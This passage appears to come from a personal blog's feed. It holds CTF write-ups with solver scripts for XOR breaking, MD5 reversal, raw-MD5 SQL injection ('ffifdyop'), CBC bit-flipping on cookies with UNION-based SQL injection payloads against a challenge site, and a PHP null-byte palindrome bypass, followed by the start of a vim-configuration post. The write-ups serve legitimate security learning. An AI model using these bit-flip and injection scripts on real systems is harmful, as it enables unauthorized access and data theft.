<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(b1, b2)</span>:</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span><span class="params">(text)</span>:</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"6.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        text += line</span><br><span class="line"><span class="comment">#  b = base64.b64decode(text)</span></span><br><span class="line">    b = text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">"utf-8"</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">"keysize:"</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">"key is:"</span>, keys, <span class="string">"n"</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="MD5">MD5</h2>
<h3 id="PHP-encrypto-1">PHP_encrypto_1</h3>
<p>source code:::</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span></span><br></pre></td></tr></table></figure>
<p>solving:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#'ISCC'md5之后的结果</span></span><br><span class="line">    $mkey =<span class="string">'729623334f0aa2784a1599fd374c120d'</span>;</span><br><span class="line">    $target=<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>;</span><br><span class="line">    $target=base64_decode($target);</span><br><span class="line"></span><br><span class="line">    $target_ay=<span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> ord($target[$i]).<span class="string">' '</span>;</span><br><span class="line">        array_push($target_ay,ord($target[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"||||||||"</span>;</span><br><span class="line">    $j=<span class="number">0</span>;</span><br><span class="line">    $realkey_ay=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($j==strlen($mkey))&#123;</span><br><span class="line">            $j=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> ord($mkey[$j]).<span class="string">' '</span>;</span><br><span class="line">        array_push($realkey_ay,ord($mkey[$j]));</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag1=<span class="string">''</span>;</span><br><span class="line">    $flag2=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($target_ay <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $i=$key;</span><br><span class="line">        $dd=$value;</span><br><span class="line">        $od=$realkey_ay[$i];</span><br><span class="line">        $flag1.=chr($dd+<span class="number">128</span>-$od);</span><br><span class="line">        $flag2.=chr($dd-$od);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-login-background">easy login background</h3>
<p><a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">link of the problem</a></p>
<p>press the ctrl+u to check the source code:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $password=$_POST['password'];</span></span><br><span class="line"><span class="comment">	$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";</span></span><br><span class="line"><span class="comment">	$result=mysqli_query($link,$sql);</span></span><br><span class="line"><span class="comment">		if(mysqli_num_rows($result)&gt;0)&#123;</span></span><br><span class="line"><span class="comment">			echo 'flag is :'.$flag;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else&#123;</span></span><br><span class="line"><span class="comment">			echo '密码错误!';</span></span><br><span class="line"><span class="comment">		&#125; --&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5($password,true) calculate md5-value;<br>
and there is a string make the sql require as :</p>
<blockquote>
<p>SELECT * FROM admin WHERE username = ‘admin’ and password = ‘’ or 6…</p>
</blockquote>
<p>and this string is :<br>
** ffifdyop **</p>
<h1>cbc 字节反转</h1>
<h2 id="javisoj-xman-2019-xbitf">javisoj xman 2019 xbitf</h2>
<p>源代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unbuffered</span><span class="params">(object)</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, attr)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> getattr(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="comment">#import signal</span></span><br><span class="line"><span class="comment">#signal.alarm(600)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=open(<span class="string">"/root/xbitf/flag"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc</span><span class="params">(key,iv,m)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc_dec</span><span class="params">(key,iv,c)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">16</span>)</span><br><span class="line">iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">session=os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">token=<span class="string">"session="</span>+session.encode(<span class="string">"hex"</span>)+<span class="string">";admin=0"</span></span><br><span class="line"> </span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line"><span class="keyword">print</span> token+<span class="string">";checksum="</span>+checksum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    token_rcv=raw_input(<span class="string">"token:"</span>)</span><br><span class="line">    <span class="keyword">if</span> token_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span> <span class="keyword">and</span> token_rcv.split(<span class="string">"session="</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">16</span>].decode(<span class="string">"hex"</span>)==session:</span><br><span class="line">        c_rcv=token_rcv.split(<span class="string">"checksum="</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        <span class="comment"># 讲解码的结果打印出来</span></span><br><span class="line">        <span class="keyword">print</span> m_rcv</span><br><span class="line">        <span class="keyword">if</span> m_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>解题脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plain = <span class="string">"session=c3b76cc709a8fddf;admin=0"</span></span><br><span class="line">checksum=<span class="string">"92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29"</span></span><br><span class="line"></span><br><span class="line">bit = (ord(checksum.decode(<span class="string">'hex'</span>)[<span class="number">15</span>]) ^ord(<span class="string">'0'</span>) ^ ord(<span class="string">'1'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容</span></span><br><span class="line">checksum_final = checksum[:<span class="number">30</span>] + hex(bit)[<span class="number">2</span>:] + checksum[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">print</span> checksum_final</span><br></pre></td></tr></table></figure>
<p>在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62346910-70f6ff00-b52a-11e9-9827-95e90cbebd1d.png" alt="image"></p>
<h2 id="bugku-login4">bugku login4</h2>
<p>这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：</p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80684485" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80684485</a></p>
<p><a href="https://www.jianshu.com/p/a61756e54f4f" target="_blank" rel="noopener">https://www.jianshu.com/p/a61756e54f4f</a></p>
<p>自己的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iv=<span class="string">'4NyZMJ9AOU5JGstqfld10A%3D%3D'</span>;</span><br><span class="line">$cipher=<span class="string">'T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D'</span>;</span><br><span class="line"><span class="comment">//username=bdmin password=111</span></span><br><span class="line"></span><br><span class="line">$iv=base64_decode(urldecode($iv));</span><br><span class="line">$cipher=base64_decode(urldecode(($cipher)));</span><br><span class="line"></span><br><span class="line">$source=<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'bdmin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'111'</span>);</span><br><span class="line">$plain=serialize($source);</span><br><span class="line"></span><br><span class="line">$plain1 = substr($plain,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">$plain2 = substr($plain,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">$cipher[<span class="number">9</span>] = chr(ord($cipher[<span class="number">9</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'a'</span>));</span><br><span class="line"></span><br><span class="line">$new_iv=<span class="string">''</span>;</span><br><span class="line">$wrong_plain=base64_decode(<span class="string">"U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ=="</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">    $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv)).<span class="string">'   '</span>.urlencode(base64_encode($cipher));</span><br></pre></td></tr></table></figure>
<h2 id="实验吧-简单的登陆题">实验吧 简单的登陆题</h2>
<p>真难</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denglu</span><span class="params">(payload,idx,c1,c2)</span>:</span></span><br><span class="line">    url=<span class="string">r'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = &#123;<span class="string">'id'</span>: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">    iv=re.findall(<span class="string">r"iv=(.*?),"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    cipher=re.findall(<span class="string">r"cipher=(.*)"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=<span class="string">''</span>.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;<span class="string">'iv'</span>: iv,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>, cont)[<span class="number">0</span>]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    iv_new=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;<span class="string">'iv'</span>: iv_new, <span class="string">'cipher'</span>: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    <span class="keyword">print</span> rcont</span><br><span class="line"></span><br><span class="line">denglu(<span class="string">'12'</span>,<span class="number">4</span>,<span class="string">'2'</span>,<span class="string">'#'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
<p>自己的脚本会出现错误</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">post=&#123;<span class="string">'id'</span>:<span class="string">"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);"</span>+chr(<span class="number">0</span>)&#125;</span><br><span class="line">responce=requests.post(url,data=post)</span><br><span class="line"></span><br><span class="line">iv=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"iv=(.*?),"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"cipher=(.*)"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">(cipher,old_iv,offset,old_letter,new_letter)</span>:</span></span><br><span class="line">    cipher=list(cipher)</span><br><span class="line">    cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset]))</span><br><span class="line">    cipher=<span class="string">''</span>.join(cipher)</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(old_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    wrong_plain=base64.b64decode(re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>,res.content)[<span class="number">0</span>])</span><br><span class="line">    new_iv = <span class="string">''</span></span><br><span class="line">    right=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i]))</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(new_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer(cipher,iv,<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>
<p>错误报告如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &apos;2)ion select * from((select 1)a</span><br><span class="line">join (select 2)b join (select 3)c);&apos; at line 1</span><br></pre></td></tr></table></figure>
<p>也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题?<br>
明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的<br>
一个偏移位置为6，一个为7，这个正则要好好看看</p>
<h2 id="other">other</h2>
<h3 id="shiyanbar-do-you-really-know-php-plalindrome">shiyanbar do you really know php?(plalindrome)</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>;</span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span><br><span class="line">    $number = strval($number);</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//can not input number</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number must be int-type</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line"></span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should be plalindrome</span></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should not be plalindrome</span></span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload :2147483647%00</p>
<p>first: as there is %00, is_numeric() will not recognize it as number</p>
<p>second: both strval and intval will ignore %00 and %20</p>
<p>third: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647,<br>
so intval(7463847412)=2147483647</p>
<p>forth: the number is not plalindrome,so get the flag</p>
]]></content>
  </entry>
  <entry>
    <title>ch4ser 的 vim</title>
    <url>/2019/04/22/ch4ser%E2%80%98s%20vim/</url>
    <content><![CDATA[<h1>ch4ser 的 vim</h1>
<blockquote>
<p>前言:没有比把时间花在配置上更傻逼的事情了.</p>
</blockquote>
<p>《程序员修炼之道》中有一句话:<code>最好是精通一种编辑器，并将其用于所有编辑任务。如果不坚持使用一种编辑器，可能会面临现代的巴别特大混乱。</code> ，实质今日，深以为然。而自从接触vim之后我一直都保持着有空折腾折腾的好习惯，它的简洁和高度自由让人着迷，围绕着vim衍生出的插件数不胜数。奈何插件繁多的同时也意味着选择的困难和配置的繁琐。为了准备以后可能出现的突发情况比如配置丢失或者重新安装，特在此以实现特定功能为主题，记录自己配置vim的过程。</p>
<hr>
<p>相比较vim, neovim的速度更快.</p>
<p>为了调动食欲,先上效果图:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574401-c9250e80-aaf1-11e9-9e2b-0350e5f43c62.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574421-13a68b00-aaf2-11e9-9ab1-57b763f13f52.png" alt="image"></p>
<p>vim下打开终端</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574428-405aa280-aaf2-11e9-9045-422e38dd6e11.png" alt="image"></p>
